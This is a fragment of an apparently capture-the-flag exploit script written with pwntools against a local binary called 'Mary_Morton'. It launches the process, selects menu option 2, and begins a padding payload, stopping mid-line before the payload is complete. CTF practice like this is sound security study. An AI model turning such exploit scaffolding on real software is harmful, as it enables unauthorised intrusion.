from pwn import *
context.log_level='debug'
io=process('./Mary_Morton')
elf=ELF('./Mary_Morton')
io.recvuntil('battle')
io.sendline('2')
payload='a'*

